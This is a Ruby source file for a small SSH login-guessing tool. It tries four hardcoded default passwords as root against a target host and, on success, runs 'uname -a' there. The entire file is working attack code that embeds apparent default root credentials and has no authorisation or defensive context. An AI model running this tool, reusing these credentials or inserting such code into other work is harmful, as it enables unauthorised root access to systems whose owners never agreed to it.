
# Class to open a SSH connection to the target system, get a login, and return the connection
# to the calling program

require 'net/ssh'

class OpenSSHConnection
	def initialize(target)
		@target = target

		# the array of passwords to test
		@passwords = ["auroras","get8life","nu-AVAIL-pass","zyrion"]
	end

	def sshconnection
		iterator = 0

		print "testing known passwords"
		for element in @passwords
			begin
				Net::SSH.start(@target, 'root', :password => element) 
			rescue
				print "."
				next
			else
				print "\nsuccess with: ", element, "...checking hostname\n"	
				Net::SSH.start(@target, 'root', :password => element) do |ssh|
					results = ssh.exec! "uname -a"
					puts "results: ", results
				end
			end
		end
	end
end
